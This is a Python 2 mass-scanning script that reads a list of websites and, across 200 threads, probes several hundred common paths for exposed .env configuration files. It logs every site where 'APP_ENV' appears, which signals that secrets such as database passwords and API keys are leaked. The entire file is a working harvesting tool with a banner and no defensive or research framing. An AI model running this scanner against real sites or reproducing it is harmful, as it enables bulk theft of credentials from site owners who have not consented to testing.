import re, sys, requests, os, random, string, time, sys, os, threading, time, re, requests, os, sys, time, codecs, urllib, urllib2, binascii, base64, subprocess
from time import time as timer
import requests, re, urllib, urllib2, os, sys, codecs, binascii, json, argparse
from multiprocessing.dummy import Pool
import requests, os, sys, time, codecs, urllib, urllib2, binascii, base64, subprocess
from time import time as timer
import time
from random import sample as rand
from Queue import Queue
from platform import system
from urlparse import urlparse
from optparse import OptionParser
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
import sys, requests, re, datetime
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
init(autoreset=True)
import requests, re, os, sys, codecs, random
from multiprocessing.dummy import Pool
from time import time as timer
import time
from colorama import Fore
from urlparse import urlparse
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from platform import system
from colorama import Style
from colorama import init
init(autoreset=True)
fr = Fore.RED
fh = Fore.RED
fc = Fore.CYAN
fo = Fore.MAGENTA
fw = Fore.WHITE
fy = Fore.YELLOW
fbl = Fore.BLUE
fg = Fore.GREEN
sd = Style.DIM
fb = Fore.RESET
sn = Style.NORMAL
sb = Style.BRIGHT
warnings.simplefilter('ignore', InsecureRequestWarning)
reload(sys)
sys.setdefaultencoding('utf8')
ktnred = '\x1b[31m'
ktngreen = '\x1b[32m'
ktn3yell = '\x1b[33m'
ktn4blue = '\x1b[34m'
ktn5purp = '\x1b[35m'
ktn6blueblue = '\x1b[36m'
ktn7grey = '\x1b[37m'
CEND = '\x1b[0m'

def urlfix(url):
    if url[(-1)] == '/':
        pattern = re.compile('(.*)/')
        site = re.findall(pattern, url)
        url = site[0]
    if url[:7] != 'http://' and url[:8] != 'https://':
        url = 'http://' + url
    return url


def EXPLOIT(url):
    try:
        paths = [
			"/__tests__/test-become/.env",
			"/_static/.env",
			"/.c9/metadata/environment/.env",
			"/.docker/.env",
			"/.docker/laravel/app/.env",
			"/.env",
			"/.env.backup",
			"/.env.dev",
			"/.env.development.local",
			"/.env.docker.dev",
			"/.env.example",
			"/.env.local",
			"/.env.php",
			"/.env.prod",
			"/.env.production.local",
			"/.env.sample.php",
			"/.env.save",
			"/.env.stage",
			"/.env.test",
			"/.env.test.local",
			"/.env~",
			"/.gitlab-ci/.env",
			"/.vscode/.env",
			"/3-sequelize/final/.env",
			"/07-accessing-data/begin/vue-heroes/.env",
			"/07-accessing-data/end/vue-heroes/.env",
			"/08-routing/begin/vue-heroes/.env",
			"/08-routing/end/vue-heroes/.env",
			"/09-managing-state/begin/vue-heroes/.env",
			"/09-managing-state/end/vue-heroes/.env",
			"/31_structure_tests/.env",
			"/acme_challenges/.env",
			"/acme-challenge/.env",
			"/acme/.env",
			"/actions-server/.env",
			"/admin-app/.env",
			"/admin/.env",
			"/adminer/.env",
			"/administrator/.env",
			"/agora/.env",
			"/alpha/.env",
			"/anaconda/.env",
			"/api/.env",
			"/api/src/.env",
			"/app_dir/.env",
			"/app_nginx_static_path/.env",
			"/app-order-client/.env",
			"/app/.env",
			"/app/client/.env",
			"/app/code/community/Nosto/Tagging/.env",
			"/app/config/.env",
			"/app/config/dev/.env",
			"/app/frontend/.env",
			"/app1-static/.env",
			"/app2-static/.env",
			"/apps/.env",
			"/apps/client/.env",
			"/Archipel/.env",
			"/asset_img/.env",
			"/assets/.env",
			"/Assignment3/.env",
			"/Assignment4/.env",
			"/audio/.env",
			"/awstats/.env",
			"/babel-plugin-dotenv/test/fixtures/as-alias/.env",
			"/babel-plugin-dotenv/test/fixtures/default/.env",
			"/babel-plugin-dotenv/test/fixtures/dev-env/.env",
			"/babel-plugin-dotenv/test/fixtures/empty-values/.env",
			"/babel-plugin-dotenv/test/fixtures/filename/.env",
			"/babel-plugin-dotenv/test/fixtures/override-value/.env",
			"/babel-plugin-dotenv/test/fixtures/prod-env/.env",
			"/back-end/app/.env",
			"/back/.env",
			"/backend/.env",
			"/backend/src/.env",
			"/backendfinaltest/.env",
			"/backup/.env",
			"/base_dir/.env",
			"/basic-network/.env",
			"/bgoldd/.env",
			"/bitcoind/.env",
			"/blankon/.env",
			"/blob/.env",
			"/blog/.env",
			"/blue/.env",
			"/bookchain-client/.env",
			"/bootstrap/.env",
			"/boxes/oracle-vagrant-boxes/ContainerRegistry/.env",
			"/boxes/oracle-vagrant-boxes/Kubernetes/.env",
			"/boxes/oracle-vagrant-boxes/OLCNE/.env",
			"/bucoffea/.env",
			"/build/.env",
			"/cardea/backend/.env",
			"/cdw-backend/.env",
			"/cgi-bin/.env",
			"/ch2-mytodo/.env",
			"/ch6-mytodo/.env",
			"/ch6a-mytodo/.env",
			"/ch7-mytodo/.env",
			"/ch7a-mytodo/.env",
			"/ch8-mytodo/.env",
			"/ch8a-mytodo/.env",
			"/ch8b-mytodo/.env",
			"/Chai/.env",
			"/challenge/.env",
			"/challenges/.env",
			"/charts/liveObjects/.env",
			"/chat-client/.env",
			"/chiminey/.env",
			"/client-app/.env",
			"/client/.env",
			"/client/mutual-fund-app/.env",
			"/client/src/.env",
			"/ClientApp/.env",
			"/clld_dir/.env",
			"/cmd/testdata/expected/dot_env/.env",
			"/code/api/.env",
			"/code/web/.env",
			"/CodeGolf.Web/ClientApp/.env",
			"/codenames-frontend/.env",
			"/collab-connect-web-application/server/.env",
			"/collected_static/.env",
			"/community/.env",
			"/conf/.env",
			"/config/.env",
			"/ContainerRegistry/.env",
			"/content/.env",
			"/core/.env",
			"/core/app/.env",
			"/core/Datavase/.env",
			"/core/persistence/.env",
			"/core/src/main/resources/org/jobrunr/dashboard/frontend/.env",
			"/counterblockd/.env",
			"/counterwallet/.env",
			"/cp/.env",
			"/cron/.env",
			"/cronlab/.env",
			"/cryo_project/.env",
			"/css/.env",
			"/custom/.env",
			"/d/.env",
			"/data/.env",
			"/database/.env",
			"/dataset1/.env",
			"/dataset2/.env",
			"/default/.env",
			"/delivery/.env",
			"/demo-app/.env",
			"/demo/.env",
			"/deploy/.env",
			"/developerslv/.env",
			"/development/.env",
			"/directories/.env",
			"/dist/.env",
			"/django_project_path/.env",
			"/django-blog/.env",
			"/django/.env",
			"/doc/.env",
			"/docker-compose/platform/.env",
			"/docker-elk/.env",
			"/docker-network-healthcheck/.env",
			"/docker-node-mongo-redis/.env",
			"/docker/.env",
			"/docker/app/.env",
			"/docker/compose/withMongo/.env",
			"/docker/compose/withPostgres/.env",
			"/docker/database/.env",
			"/docker/db/.env",
			"/docker/examples/compose/.env",
			"/docker/postgres/.env",
			"/docker/webdav/.env",
			"/docs/.env",
			"/dodoswap-client/.env",
			"/dotfiles/.env",
			"/download/.env",
			"/downloads/.env",
			"/e2e/.env",
			"/en/.env",
			"/engine/.env",
			"/env/.env",
			"/env/dockers/mariadb-test/.env",
			"/env/dockers/php-apache/.env",
			"/env/example/.env",
			"/env/template/.env",
			"/environments/local/.env",
			"/environments/production/.env",
			"/error/.env",
			"/errors/.env",
			"/example/.env",
			"/example02-golang-package/import-underscore/.env",
			"/example27-how-to-load-env/sample01/.env",
			"/example27-how-to-load-env/sample02/.env",
			"/examples/.env",
			"/examples/01-simple-model/.env",
			"/examples/02-complex-example/.env",
			"/examples/03-one-to-many-relationship/.env",
			"/examples/04-many-to-many-relationship/.env",
			"/examples/05-migrations/.env",
			"/examples/06-base-service/.env",
			"/examples/07-feature-flags/.env",
			"/examples/08-performance/.env",
			"/examples/09-production/.env",
			"/examples/10-subscriptions/.env",
			"/examples/11-transactions/.env",
			"/examples/drupal-separate-services/.env",
			"/examples/react-dashboard/backend/.env",
			"/examples/sdl-first/.env",
			"/examples/sdl-first/prisma/.env",
			"/examples/vue-dashboard/backend/.env",
			"/examples/web/.env",
			"/examples/with-cookie-auth-fauna/.env",
			"/examples/with-dotenv/.env",
			"/examples/with-firebase-authentication-serverless/.env",
			"/examples/with-react-relay-network-modern/.env",
			"/examples/with-relay-modern/.env",
			"/examples/with-universal-configuration-build-time/.env",
			"/exapi/.env",
			"/Exercise.Frontend/.env",
			"/Exercise.Frontend/train/.env",
			"/export/.env",
			"/fastlane/.env",
			"/favicons/.env",
			"/favs/.env",
			"/FE/huey/.env",
			"/fedex/.env",
			"/fhir-api/.env",
			"/files/.env",
			"/fileserver/.env",
			"/films/.env",
			"/Final_Project/Airflow_Dag/.env",
			"/Final_Project/kafka_twitter/.env",
			"/Final_Project/StartingFile/.env",
			"/finalVersion/lcomernbootcamp/projbackend/.env",
			"/FIRST_CONFIG/.env",
			"/first-network/.env",
			"/fisdom/fisdom/.env",
			"/fixtures/blocks/.env",
			"/fixtures/fiber-debugger/.env",
			"/fixtures/flight/.env",
			"/fixtures/kitchensink/.env",
			"/flask_test_uploads/.env",
			"/fm/.env",
			"/font-icons/.env",
			"/fonts/.env",
			"/front-app/.env",
			"/front-empathy/.env",
			"/front-end/.env",
			"/front/.env",
			"/front/src/.env",
			"/frontend/.env",
			"/frontend/momentum-fe/.env",
			"/frontend/react/.env",
			"/frontend/vue/.env",
			"/frontendfinaltest/.env",
			"/ftp/.env",
			"/ftpmaster/.env",
			"/gists/cache",
			"/gists/laravel",
			"/gists/pusher",
			"/github-connect/.env",
			"/grems-api/.env",
			"/grems-frontend/.env",
			"/Hash/.env",
			"/hasura/.env",
			"/Helmetjs/.env",
			"/hgs-static/.env",
			"/higlass-website/.env",
			"/home/.env",
			"/horde/.env",
			"/hotpot-app-frontend/.env",
			"/htdocs/.env",
			"/html/.env",
			"/http/.env",
			"/httpboot/.env",
			"/HUNIV_migration/.env",
			"/icon/.env",
			"/icons/.env",
			"/ikiwiki/.env",
			"/image_data/.env",
			"/Imagebord/.env",
			"/images/.env",
			"/img/.env",
			"/install/.env",
			"/InstantCV/server/.env",
			"/items/.env",
			"/javascript/.env",
			"/js-plugin/.env",
			"/js/.env",
			"/jsrelay/.env",
			"/jupyter/.env",
			"/khanlinks/.env",
			"/kibana/.env",
			"/kodenames-server/.env",
			"/kolab-syncroton/.env",
			"/Kubernetes/.env",
			"/lab/.env",
			"/laravel/.env",
			"/latest/.env",
			"/layout/.env",
			"/lcomernbootcamp/projbackend/.env",
			"/leafer-app/.env",
			"/ledger_sync/.env",
			"/legacy/tests/9.1.1",
			"/legacy/tests/9.2.0",
			"/legal/.env",
			"/lemonldap-ng-doc/.env",
			"/lemonldap-ng-fr-doc/.env",
			"/letsencrypt/.env",
			"/lib/.env",
			"/Library/.env",
			"/libs/.env",
			"/linux/.env",
			"/local/.env",
			"/log/.env",
			"/logging/.env",
			"/login/.env",
			"/mail/.env",
			"/mailinabox/.env",
			"/mailman/.env",
			"/main_user/.env",
			"/main/.env",
			"/manual/.env",
			"/master/.env",
			"/media/.env",
			"/memcached/.env",
			"/mentorg-lava-docker/.env",
			"/micro-app-react-communication/.env",
			"/micro-app-react/.env",
			"/mindsweeper/gui/.env",
			"/minified/.env",
			"/misc/.env",
			"/Modix/ClientApp/.env",
			"/monerod/.env",
			"/mongodb/config/dev/.env",
			"/monitoring/compose/.env",
			"/moodledata/.env",
			"/msks/.env",
			"/munki_repo/.env",
			"/music/.env",
			"/MyRentals.Web/ClientApp/.env",
			"/name/.env",
			"/new-js/.env",
			"/news-app/.env",
			"/nginx-server/.env",
			"/nginx/.env",
			"/niffler-frontend/.env",
			"/node_modules/.env",
			"/Nodejs-Projects/play-ground/login/.env",
			"/Nodejs-Projects/play-ground/ManageUserRoles/.env",
			"/noVNC/.env",
			"/Nuke.App.Ui/.env",
			"/oldsanta/.env",
			"/ops/vagrant/.env",
			"/option/.env",
			"/orientdb-client/.env",
			"/outputs/.env",
			"/owncloud/.env",
			"/packages/api/.env",
			"/packages/app/.env",
			"/packages/client/.env",
			"/packages/frontend/.env",
			"/packages/plugin-analytics/src/fixtures/analytics-ga-key/.env",
			"/packages/plugin-qiankun/examples/app1/.env",
			"/packages/plugin-qiankun/examples/app2/.env",
			"/packages/plugin-qiankun/examples/app3/.env",
			"/packages/plugin-qiankun/examples/master/.env",
			"/packages/react-scripts/fixtures/kitchensink/template/.env",
			"/packages/styled-ui-docs/.env",
			"/packages/web/.env",
			"/packed/.env",
			"/page-editor/.env",
			"/parity/.env",
			"/Passportjs/.env",
			"/patchwork/.env",
			"/path/.env",
			"/pfbe/.env",
			"/pictures/.env",
			"/playground/.env",
			"/plugin_static/.env",
			"/post-deployment/.vscode/.env",
			"/postfixadmin/.env",
			"/price_hawk_client/.env",
			"/prisma/.env",
			"/private/.env",
			"/processor/.env",
			"/prod/.env",
			"/projbackend/.env",
			"/project_root/.env",
			"/psnlink/.env",
			"/pt2/countries/src/.env",
			"/pt8/library-backend-gql/.env",
			"/pub/.env",
			"/public_html/.env",
			"/public_root/.env",
			"/public/.env",
			"/question2/.env",
			"/qv-frontend/.env",
			"/rabbitmq-cluster/.env",
			"/rails-api/react-app/.env",
			"/rasax/.env",
			"/react_todo/.env",
			"/redmine/.env",
			"/repo/.env",
			"/repos/.env",
			"/repository/.env",
			"/resources/.env",
			"/resources/docker/.env",
			"/resources/docker/mysql/.env",
			"/resources/docker/phpmyadmin/.env",
			"/resources/docker/rabbitmq/.env",
			"/resources/docker/rediscommander/.env",
			"/resourcesync/.env",
			"/rest/.env",
			"/restapi/.env",
			"/results/.env",
			"/robots/.env",
			"/root/.env",
			"/rosterBack/.env",
			"/roundcube/.env",
			"/roundcubemail/.env",
			"/routes/.env",
			"/run/.env",
			"/rust-backend/.env",
			"/rust-backend/dao/.env",
			"/s-with-me-front/.env",
			"/saas/.env",
			"/samples/chatroom/chatroom-spa/.env",
			"/samples/docker/deploymentscripts/.env",
			"/script/.env",
			"/scripts/.env",
			"/scripts/fvt/.env",
			"/selfish-darling-backend/.env",
			"/Serve_time_server/.env",
			"/serve-browserbench/.env",
			"/Server_with_db/.env",
			"/server/.env",
			"/server/config/.env",
			"/server/laravel/.env",
			"/server/src/persistence/.env",
			"/services/adminer/.env",
			"/services/deployment-agent/.env",
			"/services/documents/.env",
			"/services/graylog/.env",
			"/services/jaeger/.env",
			"/services/minio/.env",
			"/services/monitoring/.env",
			"/services/portainer/.env",
			"/services/redis-commander/.env",
			"/services/registry/.env",
			"/services/simcore/.env",
			"/services/traefik/.env",
			"/sessions/.env",
			"/shared/.env",
			"/shibboleth/.env",
			"/shop/.env",
			"/Simple_server/.env",
			"/site-library/.env",
			"/site/.env",
			"/sitemaps/.env",
			"/sites/.env",
			"/sitestatic/.env",
			"/Socketio/.env",
			"/sources/.env",
			"/Sources/API/.env",
			"/spearmint/.env",
			"/spikes/config-material-app/.env",
			"/SpotiApps/.env",
			"/src/__tests__/__fixtures__/instanceWithDependentSteps/.env",
			"/src/__tests__/__fixtures__/typeScriptIntegrationProject/.env",
			"/src/__tests__/__fixtures__/typeScriptProject/.env",
			"/src/__tests__/__fixtures__/typeScriptVisualizeProject/.env",
			"/src/.env",
			"/src/add-auth/express/.env",
			"/src/assembly/.env",
			"/src/character-service/.env",
			"/src/client/mobile/.env",
			"/src/core/tests/dotenv-files/.env",
			"/src/gameprovider-service/.env",
			"/src/main/front-end/.env",
			"/src/main/resources/archetype-resources/__rootArtifactId__-acceptance-test/src/test/resources/app-launcher-tile/.env",
			"/src/renderer/.env",
			"/srv6_controller/controller/.env",
			"/srv6_controller/examples/.env",
			"/srv6_controller/node-manager/.env",
			"/st-js-be-2020-movies-two/.env",
			"/stackato-pkg/.env",
			"/static_prod/.env",
			"/static_root/.env",
			"/static_user/.env",
			"/static-collected/.env",
			"/static-html/.env",
			"/static-root/.env",
			"/static/.env",
			"/staticfiles/.env",
			"/stats/.env",
			"/storage/.env",
			"/style/.env",
			"/styles/.env",
			"/stylesheets/.env",
			"/symfony/.env",
			"/system-config/.env",
			"/system/.env",
			"/target/.env",
			"/temanr9/.env",
			"/temanr10/.env",
			"/temp/.env",
			"/template/.env",
			"/templates/.env",
			"/test-network/.env",
			"/test-network/addOrg3/.env",
			"/test/.env",
			"/test/aries-js-worker/fixtures/.env",
			"/test/bdd/fixtures/adapter-rest/.env",
			"/test/bdd/fixtures/agent-rest/.env",
			"/test/bdd/fixtures/couchdb/.env",
			"/test/bdd/fixtures/demo/.env",
			"/test/bdd/fixtures/demo/openapi/.env",
			"/test/bdd/fixtures/did-method-rest/.env",
			"/test/bdd/fixtures/did-rest/.env",
			"/test/bdd/fixtures/edv-rest/.env",
			"/test/bdd/fixtures/openapi-demo/.env",
			"/test/bdd/fixtures/sidetree-mock/.env",
			"/test/bdd/fixtures/universalresolver/.env",
			"/test/bdd/fixtures/vc-rest/.env",
			"/test/fixtures/.env",
			"/test/fixtures/app_types/node/.env",
			"/test/fixtures/app_types/rails/.env",
			"/test/fixtures/node_path/.env",
			"/test/integration/env-config/app/.env",
			"/testfiles/.env",
			"/testing/docker/.env",
			"/tests/.env",
			"/Tests/Application/.env",
			"/tests/default_settings/v7.0/.env",
			"/tests/default_settings/v8.0/.env",
			"/tests/default_settings/v9.0/.env",
			"/tests/default_settings/v10.0/.env",
			"/tests/default_settings/v11.0/.env",
			"/tests/default_settings/v12.0/.env",
			"/tests/default_settings/v13.0/.env",
			"/tests/drupal-test/.env",
			"/tests/Integration/Environment/.env",
			"/tests/todo-react/.env",
			"/testwork_json/.env",
			"/theme_static/.env",
			"/theme/.env",
			"/thumb/.env",
			"/thumbs/.env",
			"/tiedostot/.env",
			"/tmp/.env",
			"/tools/.env",
			"/Travel_form/.env",
			"/ts/prime/.env",
			"/ubuntu/.env",
			"/ui/.env",
			"/unixtime/.env",
			"/unsplash-downloader/.env",
			"/upfiles/.env",
			"/upload/.env",
			"/uploads/.env",
			"/urlmem-app/.env",
			"/User_info/.env",
			"/v1/.env",
			"/v2/.env",
			"/var/backup/.env",
			"/vendor/.env",
			"/vendor/github.com/gobuffalo/envy/.env",
			"/vendor/github.com/subosito/gotenv/.env",
			"/videos/.env",
			"/vm-docker-compose/.env",
			"/vod_installer/.env",
			"/vue_CRM/.env",
			"/vue-end/vue-til/.env",
			"/vue/vuecli/.env",
			"/web-dist/.env",
			"/web/.env",
			"/Web/siteMariage/.env",
			"/webroot_path/.env",
			"/websocket/.env",
			"/webstatic/.env",
			"/webui/.env",
			"/well-known/.env",
			"/whturk/.env",
			"/windows/tests/9.2.x/.env",
			"/windows/tests/9.3.x/.env",
			"/wp-content/.env",
			"/www-data/.env",
			"/www/.env",
			"/xx-final/vue-heroes/.env",
			"/zmusic-frontend/.env"]
        for path in paths:
            try:
                payload = url + path
                se3 = requests.session()
                Agent3 = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
                ktn3 = se3.get(payload, headers=Agent3, verify=False, timeout=30)
                if 'APP_ENV' in ktn3.content:
                    print ('{}{} [SUCCESS ENV] ---->  [BETO] :').format(fy, sb) + url
                    open('ENVVULN.txt', 'a').write(payload + '\n')
                    break
                else:
                    print ('{}{} [NOT VULN ENV] [0] -------> ').format(fr, sb) + url
            except:
                print ('{}{} [FILED] -------> ').format(fr, sb) + url

    except:
        print ('{}{} Site Error !! [FILED] -------> ').format(fr, sb) + url


def check(url):
    try:
        url = urlfix(url)
        Agent = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
        se = requests.session()
        ktn1 = se.get(url, headers=Agent, verify=False, timeout=30)
        if ktn1.status_code == 200:
            print ('{}{} [SITE IS WORKING LOOKING FOR VULN] ---->  [BETO] :').format(fy, sb) + url
            EXPLOIT(url)
        else:
            print ('{}{} SITE IS DOWN... -------> ').format(fr, sb) + url
    except:
        pass


def logo():
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    x = """

          _____                    _____             _____                   _______         
         /\    \                  /\    \           /\    \                 /::\    \        
        /::\    \                /::\    \         /::\    \               /::::\    \       
       /::::\    \              /::::\    \        \:::\    \             /::::::\    \      
      /::::::\    \            /::::::\    \        \:::\    \           /::::::::\    \     
     /:::/\:::\    \          /:::/\:::\    \        \:::\    \         /:::/~~\:::\    \    
    /:::/__\:::\    \        /:::/__\:::\    \        \:::\    \       /:::/    \:::\    \   
   /::::\   \:::\    \      /::::\   \:::\    \       /::::\    \     /:::/    / \:::\    \  
  /::::::\   \:::\    \    /::::::\   \:::\    \     /::::::\    \   /:::/____/   \:::\____\ 
 /:::/\:::\   \:::\ ___\  /:::/\:::\   \:::\    \   /:::/\:::\    \ |:::|    |     |:::|    |
/:::/__\:::\   \:::|    |/:::/__\:::\   \:::\____\ /:::/  \:::\____\|:::|____|     |:::|    |
\:::\   \:::\  /:::|____|\:::\   \:::\   \::/    //:::/    \::/    / \:::\    \   /:::/    / 
 \:::\   \:::\/:::/    /  \:::\   \:::\   \/____//:::/    / \/____/   \:::\    \ /:::/    /  
  \:::\   \::::::/    /    \:::\   \:::\    \   /:::/    /             \:::\    /:::/    /   
   \:::\   \::::/    /      \:::\   \:::\____\ /:::/    /               \:::\__/:::/    /    
    \:::\  /:::/    /        \:::\   \::/    / \::/    /                 \::::::::/    /     
     \:::\/:::/    /          \:::\   \/____/   \/____/                   \::::::/    /      
      \::::::/    /            \:::\    \                                  \::::/    /       
       \::::/    /              \:::\____\                                  \::/____/        
        \::/____/                \::/    /                                   ~~              
         ~~                       \/____/                                                    
                                                                                             


"""
    for N, line in enumerate(x.split('\n')):
        sys.stdout.write('\x1b[1;%dm%s%s\n' % (random.choice(colors), line, clear))
        time.sleep(0.05)


logo()

def Main():
    list = raw_input(('{}{}\n\t [ALL-ENV-VULN] List Please !  : ').format(fr, sb))
    list = open(list, 'r').read().splitlines()
    try:
        ThreadPool = Pool(200)
        Threads = ThreadPool.map(check, list)
    except:
        pass


if __name__ == '__main__':
    Main()